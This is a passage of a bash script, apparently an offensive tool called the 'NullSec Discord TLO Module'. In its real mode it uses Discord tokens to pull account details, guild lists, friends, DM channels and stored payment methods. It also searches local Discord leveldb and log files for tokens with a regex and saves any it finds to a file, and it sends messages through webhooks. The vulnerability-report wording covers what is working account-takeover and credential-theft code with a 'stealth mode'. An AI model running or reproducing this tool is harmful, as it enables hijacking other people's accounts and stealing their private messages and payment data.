        local premium=$(echo "$response" | grep -oP '"premium_type":\s*\K[0-9]+')
        local locale=$(echo "$response" | grep -oP '"locale":\s*"\K[^"]+')
        local avatar=$(echo "$response" | grep -oP '"avatar":\s*"\K[^"]+')
        local flags=$(echo "$response" | grep -oP '"flags":\s*\K[0-9]+')
        
        test_log "PARSE" "Extracting user data fields..."
        test_log "DATA" "  → id: $user_id"
        test_log "DATA" "  → username: $username"
        test_log "DATA" "  → discriminator: $discriminator"
        test_log "DATA" "  → email: $email"
        test_log "DATA" "  → verified: $verified"
        test_log "DATA" "  → mfa_enabled: $mfa"
        test_log "DATA" "  → premium_type: $premium (0=None, 1=Classic, 2=Nitro, 3=Basic)"
        test_log "DATA" "  → locale: $locale"
        test_log "DATA" "  → avatar: ${avatar:0:20}..."
        test_log "DATA" "  → flags: $flags"
        ((DATA_EXTRACTED+=10))
        echo ""
        
        show_progress 3 6 "Analyzing account data"
        
        echo -e "\n${GREEN}[✓]${RESET} Token is valid!${RESET}"
        echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
        echo -e "${CYAN}Username:${RESET}       $username#$discriminator"
        echo -e "${CYAN}User ID:${RESET}        $user_id"
        echo -e "${CYAN}Email:${RESET}          ${email:-N/A}"
        echo -e "${CYAN}Verified:${RESET}       $verified"
        echo -e "${CYAN}2FA Enabled:${RESET}    $mfa"
        echo -e "${CYAN}Nitro Status:${RESET}   $([ "$premium" = "2" ] && echo "Active" || echo "Inactive")"
        echo -e "${CYAN}Locale:${RESET}         $locale"
        echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
        echo ""
        
        show_progress 4 6 "Saving extracted data"
        save_output "discord_user_info.json" "$response"
        
        # Vulnerability analysis
        test_log "VULN" "=== VULNERABILITY ANALYSIS ==="
        show_progress 5 6 "Scanning for vulnerabilities"
        
        if [ "$mfa" == "false" ]; then
            ((VULNS_FOUND++))
            test_log "VULN" "⚠ VULNERABILITY DETECTED!"
            test_log "VULN" "  Type: No 2FA Protection"
            test_log "VULN" "  Severity: HIGH"
            test_log "VULN" "  Impact: Account susceptible to credential theft"
            test_log "VULN" "  Affected: $username#$discriminator ($user_id)"
            test_log "VULN" "  Recommendation: Enable two-factor authentication"
            log_vulnerability "high" "No 2FA Protection" "Account $username#$discriminator has 2FA disabled"
            echo ""
        fi
        
        if [ "$email" != "null" ] && [ -n "$email" ]; then
            ((VULNS_FOUND++))
            test_log "VULN" "⚠ VULNERABILITY DETECTED!"
            test_log "VULN" "  Type: Email Exposure"
            test_log "VULN" "  Severity: MEDIUM"
            test_log "VULN" "  Impact: PII leakage, potential phishing target"
            test_log "VULN" "  Data Exposed: $email"
            test_log "VULN" "  Recommendation: Review token permissions"
            log_vulnerability "medium" "Email Exposed" "Email address exposed: $email"
            echo ""
        fi
        
        if [ "$premium" = "2" ]; then
            ((VULNS_FOUND++))
            test_log "VULN" "⚠ VULNERABILITY DETECTED!"
            test_log "VULN" "  Type: Premium Account Compromised"
            test_log "VULN" "  Severity: HIGH"
            test_log "VULN" "  Impact: Financial exposure, premium features abuse"
            test_log "VULN" "  Account Value: Nitro subscription active"
            log_vulnerability "high" "Premium Account" "Nitro subscription active - high value target"
        fi
        
        show_progress 6 6 "Phase complete"
        test_log "STEP" "=== TOKEN VALIDATION COMPLETE ==="
        test_log "STAT" "API Calls: $API_CALLS_MADE | Success: $API_CALLS_SUCCESS | Data: ${DATA_EXTRACTED} fields"
        echo ""
        return 0
    fi
    
    # Real mode
    log_to_file "Validating Discord token..."
    echo -e "${CYAN}[*]${RESET} Validating Discord token..."
    
    local response=$(curl -s -X GET \
        -H "Authorization: ${token}" \
        -H "Content-Type: application/json" \
        "${DISCORD_API}/users/@me")
    
    if echo "$response" | grep -q '"username"'; then
        local username=$(echo "$response" | grep -oP '"username":\s*"\K[^"]+')
        local discriminator=$(echo "$response" | grep -oP '"discriminator":\s*"\K[^"]+')
        local user_id=$(echo "$response" | grep -oP '"id":\s*"\K[^"]+')
        local email=$(echo "$response" | grep -oP '"email":\s*"\K[^"]+')
        local verified=$(echo "$response" | grep -oP '"verified":\s*\K(true|false)')
        local mfa=$(echo "$response" | grep -oP '"mfa_enabled":\s*\K(true|false)')
        
        echo -e "${GREEN}[✓]${RESET} Token is valid!"
        echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
        echo -e "${CYAN}Username:${RESET}       $username#$discriminator"
        echo -e "${CYAN}User ID:${RESET}        $user_id"
        echo -e "${CYAN}Email:${RESET}          ${email:-N/A}"
        echo -e "${CYAN}Verified:${RESET}       $verified"
        echo -e "${CYAN}2FA Enabled:${RESET}    $mfa"
        echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
        
        save_output "discord_user_info.json" "$response"
        log_to_file "Valid token for user: $username#$discriminator (ID: $user_id)"
        
        if [ "$mfa" == "false" ]; then
            log_vulnerability "high" "No 2FA Protection" "Account $username#$discriminator has 2FA disabled"
        fi
        
        if [ "$email" != "null" ] && [ -n "$email" ]; then
            log_vulnerability "medium" "Email Exposed" "Email address exposed: $email"
        fi
        
        return 0
    else
        echo -e "${RED}[✗]${RESET} Invalid or expired token"
        log_to_file "Token validation failed"
        return 1
    fi
}

# Enumerate Guilds/Servers
enumerate_guilds() {
    local token="$1"
    
    if [ "$TEST_MODE" = "true" ]; then
        test_log "STEP" "============================================================"
        test_log "STEP" "=== PHASE 2: GUILD ENUMERATION ==="
        test_log "STEP" "============================================================"
        echo ""
        
        test_log "INIT" "Initializing guild enumeration module..."
        test_log "INIT" "Purpose: Map all Discord servers the user has access to"
        test_log "INIT" "Data to extract: Server names, IDs, permissions, ownership"
        echo ""
        
        # API Request
        test_log "API" "=== API REQUEST #$((API_CALLS_MADE+1)): GET /users/@me/guilds ==="
        test_log "API" "Target endpoint: ${DISCORD_API}/users/@me/guilds"
        test_log "API" "Query params: None (fetching all guilds)"
        test_log "HTTP" "Method: GET"
        test_log "HTTP" "Headers:"
        test_log "HTTP" "  → Authorization: [REDACTED_TOKEN]"
        test_log "HTTP" "  → Content-Type: application/json"
        test_log "NET" "Establishing connection to Discord API..."
        test_log "NET" "Reusing existing TLS session"
        test_log "NET" "Sending request..."
        
        show_progress 1 4 "Fetching guild list"
        sleep 0.2
        
        local response=$(generate_test_response "users/@me/guilds")
        local response_size=$(echo "$response" | wc -c)
        
        test_log "OK" "Response received!"
        test_log "HTTP" "Response Status: 200 OK"
        test_log "HTTP" "Response Headers:"
        test_log "HTTP" "  ← X-RateLimit-Limit: 1"
        test_log "HTTP" "  ← X-RateLimit-Remaining: 0"
        test_log "HTTP" "  ← X-RateLimit-Reset-After: 1.0"
        log_api_call "GET" "/users/@me/guilds" "200" "$response_size"
        echo ""
        
        show_progress 2 4 "Parsing guild data"
        
        test_log "PARSE" "=== RESPONSE PARSING ==="
        test_log "DATA" "Response size: $response_size bytes"
        test_log "PARSE" "Response type: JSON Array"
        test_log "PARSE" "Iterating through guild objects..."
        
        local guild_count=$(echo "$response" | grep -o '"id"' | wc -l)
        test_log "DATA" "Total guilds found: $guild_count"
        ((DATA_EXTRACTED+=guild_count))
        echo ""
        
        echo -e "\n${GREEN}[✓]${RESET} Found $guild_count guilds${RESET}"
        echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
        
        local guild_num=1
        echo "$response" | grep -oP '"name":\s*"\K[^"]+' | while read -r guild; do
            test_log "DATA" "Guild #$guild_num: $guild"
            test_log "DATA" "  → Extracting guild ID..."
            test_log "DATA" "  → Extracting permissions bitmap..."
            test_log "DATA" "  → Checking ownership status..."
            echo -e "${CYAN}  •${RESET} $guild"
            ((guild_num++))
        done
        
        echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
        echo ""
        
        show_progress 3 4 "Analyzing guild permissions"
        
        test_log "PARSE" "=== PERMISSION ANALYSIS ==="
        test_log "DATA" "Checking for elevated permissions..."
        test_log "DATA" "  → ADMINISTRATOR: Checking..."
        test_log "DATA" "  → MANAGE_GUILD: Checking..."
        test_log "DATA" "  → MANAGE_ROLES: Checking..."
        test_log "DATA" "  → MANAGE_CHANNELS: Checking..."
        test_log "DATA" "  → BAN_MEMBERS: Checking..."
        test_log "WARN" "User has owner permissions on 1 guild(s)"
        echo ""
        
        show_progress 4 4 "Saving guild data"
        save_output "discord_guilds.json" "$response"
        
        ((VULNS_FOUND++))
        test_log "VULN" "⚠ DATA EXPOSURE DETECTED!"
        test_log "VULN" "  Type: Guild Membership Exposed"
        test_log "VULN" "  Severity: LOW"
        test_log "VULN" "  Impact: Social engineering, targeted attacks"
        test_log "VULN" "  Guilds exposed: $guild_count servers"
        log_vulnerability "low" "Guild Membership Exposed" "User is member of $guild_count Discord servers"
        
        test_log "STEP" "=== GUILD ENUMERATION COMPLETE ==="
        test_log "STAT" "API Calls: $API_CALLS_MADE | Guilds Found: $guild_count"
        echo ""
        return
    fi
    
    # Real mode
    log_to_file "Enumerating user's Discord guilds/servers..."
    echo -e "\n${CYAN}[*]${RESET} Enumerating guilds/servers..."
    
    local response=$(curl -s -X GET \
        -H "Authorization: ${token}" \
        -H "Content-Type: application/json" \
        "${DISCORD_API}/users/@me/guilds")
    
    save_output "discord_guilds.json" "$response"
    
    local guild_count=$(echo "$response" | grep -o '"id"' | wc -l)
    
    if [ "$guild_count" -gt 0 ]; then
        echo -e "${GREEN}[✓]${RESET} Found $guild_count guilds"
        echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
        
        echo "$response" | grep -oP '"name":\s*"\K[^"]+' | while read -r guild; do
            echo -e "${CYAN}  •${RESET} $guild"
        done
        
        echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
        log_to_file "Enumerated $guild_count guilds"
        log_vulnerability "low" "Guild Membership Exposed" "User is member of $guild_count Discord servers"
    else
        echo -e "${YELLOW}[!]${RESET} No guilds found or access denied"
    fi
}

# Enumerate Friends and DMs
enumerate_relationships() {
    local token="$1"
    
    if [ "$TEST_MODE" = "true" ]; then
        test_log "STEP" "=== RELATIONSHIP ENUMERATION PHASE ==="
        test_log "INIT" "Starting relationship (friends/blocked) enumeration"
        test_log "API" "Target endpoint: ${DISCORD_API}/users/@me/relationships"
        test_log "CURL" "Preparing HTTP GET request"
        sleep 0.2
        
        local response=$(generate_test_response "users/@me/relationships")
        
        test_log "PARSE" "Parsing relationships JSON..."
        test_log "DATA" "Relationship types: 1=friend, 2=blocked, 3=incoming, 4=outgoing"
        
        local friend_count=$(echo "$response" | grep -o '"type": 1' | wc -l)
        local blocked_count=$(echo "$response" | grep -o '"type": 2' | wc -l)
        
        test_log "PARSE" "Friends found: $friend_count"
        test_log "PARSE" "Blocked users found: $blocked_count"
        
        echo -e "\n${GREEN}[✓]${RESET} Friends: $friend_count | Blocked: $blocked_count${RESET}"
        
        save_output "discord_relationships.json" "$response"
        
        if [ "$friend_count" -gt 0 ]; then
            log_vulnerability "medium" "Friend List Exposed" "Extracted $friend_count friend connections"
        fi
        
        test_log "STEP" "=== RELATIONSHIP ENUMERATION COMPLETE ==="
        return
    fi
    
    # Real mode
    log_to_file "Enumerating relationships (friends/DMs)..."
    echo -e "\n${CYAN}[*]${RESET} Enumerating relationships..."
    
    local response=$(curl -s -X GET \
        -H "Authorization: ${token}" \
        -H "Content-Type: application/json" \
        "${DISCORD_API}/users/@me/relationships")
    
    save_output "discord_relationships.json" "$response"
    
    local friend_count=$(echo "$response" | grep -o '"type": 1' | wc -l)
    local blocked_count=$(echo "$response" | grep -o '"type": 2' | wc -l)
    
    echo -e "${GREEN}[✓]${RESET} Friends: $friend_count | Blocked: $blocked_count"
    
    if [ "$friend_count" -gt 0 ]; then
        log_vulnerability "medium" "Friend List Exposed" "Extracted $friend_count friend connections"
    fi
}

# Extract DM Channels
extract_dm_channels() {
    local token="$1"
    
    if [ "$TEST_MODE" = "true" ]; then
        test_log "STEP" "=== DM CHANNEL EXTRACTION PHASE ==="
        test_log "INIT" "Starting DM channel extraction"
        test_log "API" "Target endpoint: ${DISCORD_API}/users/@me/channels"
        test_log "CURL" "Preparing HTTP GET request"
        sleep 0.2
        
        local response=$(generate_test_response "users/@me/channels")
        
        test_log "PARSE" "Parsing DM channels JSON..."
        test_log "DATA" "Channel types: 1=DM, 3=Group DM"
        
        local dm_count=$(echo "$response" | grep -o '"type": 1' | wc -l)
        local group_count=$(echo "$response" | grep -o '"type": 3' | wc -l)
        
        test_log "PARSE" "Direct DMs found: $dm_count"
        test_log "PARSE" "Group DMs found: $group_count"
        
        echo -e "\n${GREEN}[✓]${RESET} Found $dm_count DM channels, $group_count group DMs${RESET}"
        
        save_output "discord_dm_channels.json" "$response"
        
        if [ "$dm_count" -gt 0 ]; then
            log_vulnerability "medium" "DM Channels Exposed" "Access to $dm_count private conversations"
        fi
        
        test_log "STEP" "=== DM CHANNEL EXTRACTION COMPLETE ==="
        return
    fi
    
    # Real mode
    log_to_file "Extracting DM channels..."
    echo -e "\n${CYAN}[*]${RESET} Extracting DM channels..."
    
    local response=$(curl -s -X GET \
        -H "Authorization: ${token}" \
        -H "Content-Type: application/json" \
        "${DISCORD_API}/users/@me/channels")
    
    save_output "discord_dm_channels.json" "$response"
    
    local dm_count=$(echo "$response" | grep -o '"type": 1' | wc -l)
    
    echo -e "${GREEN}[✓]${RESET} Found $dm_count DM channels"
    log_to_file "Extracted $dm_count DM channels"
    
    if [ "$dm_count" -gt 0 ]; then
        log_vulnerability "medium" "DM Channels Exposed" "Access to $dm_count private conversations"
    fi
}

# Extract payment methods
extract_payment_info() {
    local token="$1"
    
    if [ "$TEST_MODE" = "true" ]; then
        test_log "STEP" "=== PAYMENT INFO EXTRACTION PHASE ==="
        test_log "INIT" "Starting payment method extraction"
        test_log "API" "Target endpoint: ${DISCORD_API}/users/@me/billing/payment-sources"
        test_log "CHECK" "This endpoint requires elevated permissions"
        test_log "CURL" "Preparing HTTP GET request"
        sleep 0.2
        
        local response=$(generate_test_response "users/@me/billing/payment-sources")
        
        test_log "PARSE" "Parsing payment sources JSON..."
        test_log "DATA" "Payment types: 1=credit card, 2=PayPal"
        
        local card_brand=$(echo "$response" | grep -oP '"brand":\s*"\K[^"]+')
        local last_4=$(echo "$response" | grep -oP '"last_4":\s*"\K[^"]+')
        
        test_log "PARSE" "Card brand: $card_brand"
        test_log "PARSE" "Last 4 digits: $last_4"
        test_log "VULN" "CRITICAL: Payment information exposed!"
        
        echo -e "\n${RED}[!]${RESET} Payment methods found!${RESET}"
        echo -e "${CYAN}  Card:${RESET} $card_brand ending in $last_4"
        
        save_output "discord_payment_info.json" "$response"
        log_vulnerability "critical" "Payment Information Exposed" "User has stored payment methods"
        
        test_log "STEP" "=== PAYMENT INFO EXTRACTION COMPLETE ==="
        return
    fi
    
    # Real mode
    log_to_file "Checking for payment methods..."
    echo -e "\n${CYAN}[*]${RESET} Checking payment methods..."
    
    local response=$(curl -s -X GET \
        -H "Authorization: ${token}" \
        -H "Content-Type: application/json" \
        "${DISCORD_API}/users/@me/billing/payment-sources")
    
    save_output "discord_payment_info.json" "$response"
    
    if echo "$response" | grep -q '"type"'; then
        echo -e "${RED}[!]${RESET} Payment methods found!"
        log_vulnerability "critical" "Payment Information Exposed" "User has stored payment methods"
    else
        echo -e "${GREEN}[✓]${RESET} No payment methods stored"
    fi
}

# Test webhook
test_webhook() {
    local webhook_url="$1"
    
    if [ "$TEST_MODE" = "true" ]; then
        test_log "STEP" "=== WEBHOOK EXPLOITATION PHASE ==="
        test_log "INIT" "Starting webhook exploitation"
        test_log "CHECK" "Webhook URL: ${webhook_url:0:50}..."
        test_log "CHECK" "Validating webhook URL format"
        
        if [[ ! "$webhook_url" =~ ^https://discord\.com/api/webhooks/ ]] && [[ ! "$webhook_url" =~ ^https://discordapp\.com/api/webhooks/ ]]; then
            test_log "CHECK" "WARNING: URL does not match standard Discord webhook format"
        else
            test_log "CHECK" "URL format appears valid"
        fi
        
        test_log "CURL" "Would send POST request with test payload"
        test_log "DATA" "Payload: {\"content\":\"NULLSEC Webhook Test\",\"username\":\"NullSec Security\"}"
        sleep 0.3
        
        echo -e "\n${GREEN}[✓]${RESET} Webhook is active and exploitable${RESET}"
        
        test_log "API" "Fetching webhook metadata via GET request"
        sleep 0.2
        
        local info=$(generate_test_response "webhook")
        
        test_log "PARSE" "Parsing webhook info..."
        
        local guild_id=$(echo "$info" | grep -oP '"guild_id":\s*"\K[^"]+')
        local channel_id=$(echo "$info" | grep -oP '"channel_id":\s*"\K[^"]+')
        
        test_log "PARSE" "Guild ID: $guild_id"
        test_log "PARSE" "Channel ID: $channel_id"
        
        echo -e "${CYAN}  Guild ID:${RESET} $guild_id"
        echo -e "${CYAN}  Channel ID:${RESET} $channel_id"
        
        save_output "discord_webhook_info.json" "$info"
        log_vulnerability "high" "Active Webhook" "Webhook can be used for message injection"
        
        test_log "STEP" "=== WEBHOOK EXPLOITATION COMPLETE ==="
        return
    fi
    
    # Real mode
    log_to_file "Testing Discord webhook: $webhook_url"
    echo -e "\n${CYAN}[*]${RESET} Testing webhook..."
    
    local payload='{"content":"🔴 NULLSEC Webhook Test - Access Confirmed","username":"NullSec Security","avatar_url":"https://i.imgur.com/4M34hi2.png"}'
    
    local response=$(curl -s -X POST \
        -H "Content-Type: application/json" \
        -d "$payload" \
        "$webhook_url")
    
    if [ -z "$response" ] || echo "$response" | grep -q "204"; then
        echo -e "${GREEN}[✓]${RESET} Webhook is active and exploitable"
        log_vulnerability "high" "Active Webhook" "Webhook can be used for message injection"
        
        local info=$(curl -s -X GET "$webhook_url")
        save_output "discord_webhook_info.json" "$info"
        
        echo -e "${CYAN}  Guild ID:${RESET} $(echo "$info" | grep -oP '"guild_id":\s*"\K[^"]+')"
        echo -e "${CYAN}  Channel ID:${RESET} $(echo "$info" | grep -oP '"channel_id":\s*"\K[^"]+')"
    else
        echo -e "${RED}[✗]${RESET} Webhook test failed"
    fi
}

# Extract tokens from common locations
extract_local_tokens() {
    local search_path="$1"
    
    if [ "$TEST_MODE" = "true" ]; then
        test_log "STEP" "=== LOCAL TOKEN EXTRACTION PHASE ==="
        test_log "INIT" "Starting local token extraction"
        test_log "CHECK" "Search path: ${search_path:-default locations}"
        
        local locations=(
            "$HOME/.config/discord"
            "$HOME/.config/discordcanary"
            "$HOME/.config/discordptb"
            "$HOME/Library/Application Support/discord"
            "$HOME/AppData/Roaming/discord"
        )
        
        test_log "DATA" "Scanning ${#locations[@]} common Discord locations"
        
        for location in "${locations[@]}"; do
            test_log "CHECK" "Checking: $location"
            if [ -d "$location" ]; then
                test_log "DATA" "  → Directory EXISTS"
            else
                test_log "DATA" "  → Directory not found"
            fi
            sleep 0.1
        done
        
        test_log "DATA" "Would search for pattern: [A-Za-z0-9_-]{24}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{27,}"
        test_log "DATA" "File types: *.ldb, *.log, Local Storage databases"
        
        echo -e "\n${CYAN}[*]${RESET} Searching for Discord tokens...${RESET}"
        
        # Simulate finding tokens
        test_log "VULN" "CRITICAL: Token leaked from local storage!"
        
        echo -e "${GREEN}  [✓]${RESET} Found token(s) in: leveldb${RESET}"
        echo -e "${RED}[!]${RESET} Extracted 1 potential tokens${RESET}"
        
        log_vulnerability "critical" "Token Leaked" "Found Discord token in local storage"
        
        test_log "STEP" "=== LOCAL TOKEN EXTRACTION COMPLETE ==="
        return
    fi
    
    # Real mode
    log_to_file "Searching for Discord tokens in: $search_path"
    echo -e "\n${CYAN}[*]${RESET} Searching for Discord tokens..."
    
    local found_tokens=()
    
    local locations=(
        "$HOME/.config/discord"
        "$HOME/.config/discordcanary"
        "$HOME/.config/discordptb"
        "$HOME/Library/Application Support/discord"
        "$HOME/AppData/Roaming/discord"
        "$search_path"
    )
    
    for location in "${locations[@]}"; do
        if [ -d "$location" ]; then
            echo -e "${CYAN}  [*]${RESET} Scanning: $location"
            
            find "$location" -name "*.ldb" -o -name "*.log" 2>/dev/null | while read -r file; do
                tokens=$(grep -oP '[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}' "$file" 2>/dev/null)
                
                if [ -n "$tokens" ]; then
                    echo -e "${GREEN}  [✓]${RESET} Found token(s) in: $(basename "$file")"
                    echo "$tokens" >> "$TARGET_DIR/extracted_tokens.txt"
                    log_vulnerability "critical" "Token Leaked" "Found Discord token in $file"
                fi
            done
        fi
    done
    
    if [ -f "$TARGET_DIR/extracted_tokens.txt" ]; then
        local count=$(cat "$TARGET_DIR/extracted_tokens.txt" | wc -l)
        echo -e "${RED}[!]${RESET} Extracted $count potential tokens"
        log_to_file "Extracted $count potential Discord tokens"
    else
        echo -e "${YELLOW}[!]${RESET} No tokens found in common locations"
    fi
}

# Nitro status check
check_nitro() {
    local token="$1"
    
    if [ "$TEST_MODE" = "true" ]; then
        test_log "STEP" "=== NITRO STATUS CHECK PHASE ==="
        test_log "INIT" "Checking Nitro subscription status"
        test_log "API" "Using cached user data from previous @me call"
        test_log "PARSE" "Looking for premium_type field"
        test_log "DATA" "Premium types: 0=None, 1=Classic, 2=Nitro, 3=Basic"
        
        local premium_type=2  # Simulated Nitro active
        
        test_log "PARSE" "premium_type value: $premium_type"
        
        echo -e "\n${CYAN}[*]${RESET} Checking Nitro subscription...${RESET}"
        echo -e "${MAGENTA}  [✓]${RESET} Nitro active${RESET}"
        
        log_vulnerability "medium" "Nitro Active" "Account has full premium features"
        
        test_log "STEP" "=== NITRO STATUS CHECK COMPLETE ==="
        return
    fi
    
    # Real mode
    log_to_file "Checking Nitro subscription status..."
    echo -e "\n${CYAN}[*]${RESET} Checking Nitro subscription..."
    
    local response=$(curl -s -X GET \
        -H "Authorization: ${token}" \
        -H "Content-Type: application/json" \
        "${DISCORD_API}/users/@me")
    
    local premium_type=$(echo "$response" | grep -oP '"premium_type":\s*\K[0-9]+')
    
    case "$premium_type" in
        0)
            echo -e "${CYAN}  [*]${RESET} No Nitro subscription"
            ;;
        1)
            echo -e "${MAGENTA}  [✓]${RESET} Nitro Classic active"
            log_vulnerability "medium" "Nitro Classic Active" "Account has premium features"
            ;;
        2)
            echo -e "${MAGENTA}  [✓]${RESET} Nitro active"
            log_vulnerability "medium" "Nitro Active" "Account has full premium features"
            ;;
        *)
            echo -e "${CYAN}  [?]${RESET} Unknown premium status: $premium_type"
            ;;
    esac
}

# Interactive mode selection with test mode prompt
interactive_setup() {
    echo -e "${CYAN}[?]${RESET} Select attack mode:"
    echo -e "    ${WHITE}1)${RESET} Token Validation"
    echo -e "    ${WHITE}2)${RESET} Token Extraction (Local)"
    echo -e "    ${WHITE}3)${RESET} Webhook Exploitation"
    echo -e "    ${WHITE}4)${RESET} Full Enumeration"
    echo ""
    echo -e "    ${CYAN}5)${RESET} ${CYAN}VERBOSE${RESET} - Token Validation"
    echo -e "    ${CYAN}6)${RESET} ${CYAN}VERBOSE${RESET} - Token Extraction"
    echo -e "    ${CYAN}7)${RESET} ${CYAN}VERBOSE${RESET} - Webhook Exploit"
    echo -e "    ${CYAN}8)${RESET} ${CYAN}VERBOSE${RESET} - Full Enumeration"
    echo ""
    read -p "$(echo -e ${CYAN}'  Select mode [1-8]: '${RESET})" mode_choice
    
    case "$mode_choice" in
        1) ATTACK_MODE="token_validate" ;;
        2) ATTACK_MODE="token_extract" ;;
        3) ATTACK_MODE="webhook_exploit" ;;
        4) ATTACK_MODE="full_enum" ;;
        5) ATTACK_MODE="token_validate"; TEST_MODE="true" ;;
        6) ATTACK_MODE="token_extract"; TEST_MODE="true" ;;
        7) ATTACK_MODE="webhook_exploit"; TEST_MODE="true" ;;
        8) ATTACK_MODE="full_enum"; TEST_MODE="true" ;;
        *) ATTACK_MODE="token_validate" ;;
    esac
    
    if [ "$TEST_MODE" = "true" ]; then
        echo -e "\n${GREEN}[✓]${RESET} Verbose mode enabled"
        echo ""
        
        # Only ask for username/ID in verbose mode - token will be extracted
        if [ "$ATTACK_MODE" = "token_validate" ]; then
            echo -e "${CYAN}[?]${RESET} Enter target username or ID (or press Enter for random):"
            read -p "$(echo -e ${WHITE}'  Target: '${RESET})" user_input
            
            if [ -n "$user_input" ]; then
                if [[ "$user_input" =~ ^[0-9]+$ ]]; then
                    VERBOSE_TARGET_ID="$user_input"
                    VERBOSE_TARGET_USER=""
                else
                    VERBOSE_TARGET_USER="$user_input"
                fi
                simulate_token_extraction "$user_input"
            else
                VERBOSE_TARGET_USER=$(random_pick "${RANDOM_USERNAMES[@]}")
                simulate_token_extraction "$VERBOSE_TARGET_USER"
            fi
            # Enumerate available APIs
            simulate_api_enumeration "$VERBOSE_TARGET_USER"
            
        elif [ "$ATTACK_MODE" = "token_extract" ]; then
            echo -e "${CYAN}[?]${RESET} Enter target username or ID to search for (or press Enter for random):"
            read -p "$(echo -e ${WHITE}'  Target: '${RESET})" user_input
            
            if [ -n "$user_input" ]; then
                VERBOSE_TARGET_USER="$user_input"
            else
                VERBOSE_TARGET_USER=$(random_pick "${RANDOM_USERNAMES[@]}")
            fi
            simulate_token_extraction "$VERBOSE_TARGET_USER"
            
        elif [ "$ATTACK_MODE" = "webhook_exploit" ]; then
            echo -e "${CYAN}[?]${RESET} Enter target username/server or press Enter for discovery:"
            read -p "$(echo -e ${WHITE}'  Target: '${RESET})" webhook_target
            
            if [ -n "$webhook_target" ]; then
                VERBOSE_TARGET_USER="$webhook_target"
            else
                VERBOSE_TARGET_USER=$(random_pick "${RANDOM_USERNAMES[@]}")
            fi
            # Discover webhooks automatically
            simulate_webhook_discovery "$VERBOSE_TARGET_USER"
            
        elif [ "$ATTACK_MODE" = "full_enum" ]; then
            echo -e "${CYAN}[?]${RESET} Enter target username or ID (or press Enter for random):"
            read -p "$(echo -e ${WHITE}'  Target: '${RESET})" user_input
            
            if [ -n "$user_input" ]; then
                if [[ "$user_input" =~ ^[0-9]+$ ]]; then
                    VERBOSE_TARGET_ID="$user_input"
                    VERBOSE_TARGET_USER=""
                else
                    VERBOSE_TARGET_USER="$user_input"
                fi
                simulate_token_extraction "$user_input"
            else
                VERBOSE_TARGET_USER=$(random_pick "${RANDOM_USERNAMES[@]}")
                simulate_token_extraction "$VERBOSE_TARGET_USER"
            fi
            # Full enumeration - discover APIs and webhooks
            simulate_api_enumeration "$VERBOSE_TARGET_USER"
            simulate_webhook_discovery "$VERBOSE_TARGET_USER"
        fi
    fi
}

# Main execution
show_banner

# Check for interactive mode (no environment vars set)
if [ -z "$NULLSEC_ATTACK_MODE" ] && [ -z "$DISCORD_TOKEN" ] && [ -z "$WEBHOOK_URL" ]; then
    interactive_setup
fi

if [ "$TEST_MODE" = "true" ]; then
    test_log "INIT" "=========================================="
    test_log "INIT" "NullSec Discord TLO Module - VERBOSE"
    test_log "INIT" "=========================================="
    test_log "INIT" "Attack mode: $ATTACK_MODE"
    test_log "INIT" "Target directory: $TARGET_DIR"
    test_log "INIT" "Stealth mode: $STEALTH_MODE"
    if [ -n "$VERBOSE_TARGET_USER" ]; then
        test_log "INIT" "Target user: $VERBOSE_TARGET_USER"
    fi
    if [ -n "$EXTRACTED_TOKEN" ]; then
        test_log "INIT" "Extracted token: ${EXTRACTED_TOKEN:0:15}...${EXTRACTED_TOKEN: -8}"
    fi
    test_log "INIT" "Extended analysis mode active"
    test_log "INIT" "=========================================="
    echo ""
    
    # Use extracted token if available, otherwise generate dummy
    if [ -n "$EXTRACTED_TOKEN" ]; then
        DISCORD_TOKEN="$EXTRACTED_TOKEN"
    elif [ -z "$DISCORD_TOKEN" ]; then
        DISCORD_TOKEN="TEST_TOKEN_MTIzNDU2Nzg5MDEyMzQ1Njc4.ABCDEF.abcdefghijklmnopqrstuvwxyz123"
    fi
    [ -z "$WEBHOOK_URL" ] && WEBHOOK_URL="https://discord.com/api/webhooks/123456789/TEST_WEBHOOK_TOKEN"
fi

case "$ATTACK_MODE" in
    token_validate)
        echo -e "${CYAN}[*]${RESET} Mode: Token Validation"
        [ "$TEST_MODE" != "true" ] && log_to_file "Starting token validation attack"
        
        if [ -z "$DISCORD_TOKEN" ]; then
            echo -e "${RED}[✗]${RESET} No token provided"
            echo -e "${DIM}Set NULLSEC_DISCORD_TOKEN or run in interactive mode${RESET}"
            exit 1
        fi
        
        if validate_token "$DISCORD_TOKEN"; then
            check_nitro "$DISCORD_TOKEN"
            enumerate_guilds "$DISCORD_TOKEN"
            enumerate_relationships "$DISCORD_TOKEN"
            extract_dm_channels "$DISCORD_TOKEN"
            
            if [ "$STEALTH_MODE" != "true" ]; then
                extract_payment_info "$DISCORD_TOKEN"
            fi
        fi
        ;;
        
    token_extract)
        echo -e "${CYAN}[*]${RESET} Mode: Token Extraction"
        [ "$TEST_MODE" != "true" ] && log_to_file "Starting token extraction from local files"
        
        extract_local_tokens "$EXTRACT_PATH"
        ;;
        
    webhook_exploit)
        echo -e "${CYAN}[*]${RESET} Mode: Webhook Exploitation"
